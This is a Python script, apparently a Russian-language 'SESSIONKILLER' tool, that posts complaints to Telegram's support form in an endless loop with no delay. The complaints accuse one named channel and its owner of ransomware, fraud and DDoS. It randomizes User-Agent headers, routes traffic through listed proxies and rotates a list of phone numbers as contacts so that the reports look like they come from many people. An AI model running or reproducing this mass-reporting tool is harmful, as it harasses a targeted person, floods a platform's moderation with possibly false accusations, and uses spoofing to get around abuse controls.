import requests
import time
import random
from fake_useragent import UserAgent
from datetime import datetime
import platform
import socket
import datetime
from termcolor import colored


device_name = socket.gethostname()
ip_address = socket.gethostbyname(device_name)
current_time = datetime.datetime.now()

print(colored(f"SESSIONKILLER /// SOFT BY @TRAIN0X", 'red'))

url = 'https://telegram.org/support'
ua = UserAgent()

yukino = 0

def send_complaint(text, contact):
    headers = {
        'User-Agent': ua.random
    }
    payload = {
        'text': text,
        'contact': contact
    }
    
    proxies = {
    'http': '62.33.207.202:80',
    'http': '5.189.184.147:27191',
    'http': '50.221.74.130:80',
    'http': '172.67.43.209:80',
}
    
    response = requests.post(url, data=payload, headers=headers, proxies=proxies)
    
    if response.status_code == 200:
        print(f"\33[92m @TRAIN0X TK / Жалоба №", yukino, "отправлена [ # ] SOFT BY @TRAIN0X\33[0m")
    else:
        print(colored(f"Произошла ошибка при отправке жалобы", 'red'))

text = [
    "report in the channel https://t.me/KryptonSolutions and the owner @hecker (Insult, junk mail (spam), humiliation of human dignity, sale of unlicensed software with backdoors (RANSOMWARE), fraud, DDoS attacks on telegram servers and many other repeated violations telegram policies)",
]

contact = [
    "+75534656889",
    "+79348248343",
    "+79807444295",
    "+79661214909",
    "+79159895610",
    "+38027328836",
    "+79292738226",
    "+79118882732",
    "+79009372366",
]

while True:
    yukino += 1
    chosen_text = random.choice(text)
    chosen_contact = random.choice(contact)
    send_complaint(chosen_text, chosen_contact)
    time.sleep(0)
